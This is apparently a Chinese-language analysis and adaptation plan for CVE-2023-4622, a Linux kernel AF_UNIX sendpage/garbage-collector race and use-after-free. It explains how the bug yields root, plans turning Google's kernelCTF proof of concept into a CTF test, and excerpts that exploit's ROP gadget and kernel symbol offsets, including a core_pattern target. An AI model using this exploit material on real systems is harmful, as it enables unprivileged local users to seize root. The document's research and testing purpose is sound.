...
| CVSS | 7.8 |
| 严重等级 | CRITICAL |
| 漏洞类型 | Race Condition / UAF |
| 影响内核版本 | 5.x ~ 6.5.x |
| 利用技术 | AF_UNIX unix_stream_sendpage与unix_gc间的竞态条件 |

## 原始PoC分析

### 参考来源
- **PoC URL**: https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-4622_lts/docs/exploit.md
- **来源类型**: GitHub

### 利用原理
AF_UNIX中unix_stream_sendpage无锁获取skb导致unix_gc可释放其在用对象，形成UAF。通过精密竞态条件触发。

该漏洞的触发条件为AF_UNIX sendpage与gc间竞态条件。攻击者通过精心构造的系统调用序列，利用Race Condition / UAF类型的缺陷，在内核空间中实现代码执行或数据篡改。

利用过程中，关键的内存操作为unix_gc释放sendpage在用的skb对象。最终的提权路径通过通过AF_UNIX UAF控制skb数据实现提权完成，使非特权用户获得root权限。

### 关键技术点
1. AF_UNIX sendpage与gc间竞态条件
2. unix_gc释放sendpage在用的skb对象
3. 通过AF_UNIX UAF控制skb数据实现提权

## PoC改造计划

### CTF挑战模式适配
- **推荐测试模式**: write_root_file
- **模式选择理由**: af_unix竞争条件导致UAF，可通过堆喷实现任意内核写入和完整LPE
...
### 三阶段验证集成
- **Phase 1 (Prepare)**: 创建AF_UNIX套接字对，配置gc触发条件
- **Phase 2 (Run)**: 并发执行sendpage和gc触发竞态UAF
- **Phase 3 (Post)**: 验证提权结果、关闭所有套接字
...
Source: https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-4622_lts/exploit/lts-6.1.36/poc.c
...
#define START_ROP 0x50
#define STATIC_KBASE 0xffffffff81000000
#define POP_RDI (KERNEL_BASE + (0x014001e0))					   // pop rdi ; ret
#define POP_RSI (KERNEL_BASE + (0x01101444))					   // pop rsi ; ret
#define POP_RSI2 (KERNEL_BASE + (0x01101444))					   // pop rsi ; mov eax, xxx ; ret
#define POP_RDX (KERNEL_BASE + (0x01101c34))					   // pop rdx ; ret
#define POP_RSP (KERNEL_BASE + (0x01101aec))					   // pop rsp ; ret
#define PIVOT (KERNEL_BASE + (0xffffffff8198954b - STATIC_KBASE))  // push rsi ; jmp qword ptr [rsi + 0x39]
#define PIVOT2 (KERNEL_BASE + (0xffffffff811249fe - STATIC_KBASE)) // pop rsp ; pop r15 ; ret
#define PIVOT3 (KERNEL_BASE + (0xffffffff8195220d - STATIC_KBASE)) // push rsi; jmp qword ptr [rsi+0x39];
#define CORE_PATTERN (KERNEL_BASE + (0xffffffff837ba3a0 - STATIC_KBASE))
#define COPY_FROM_USER (KERNEL_BASE + (0xffffffff8183eaa0 - STATIC_KBASE))
#define MSLEEP (KERNEL_BASE + (0xffffffff8121fd60 - STATIC_KBASE))
#define ANON_PIPE_BUF_OPS_OFF (0xffffffff82a1c7c0 - STATIC_KBASE)
#endif
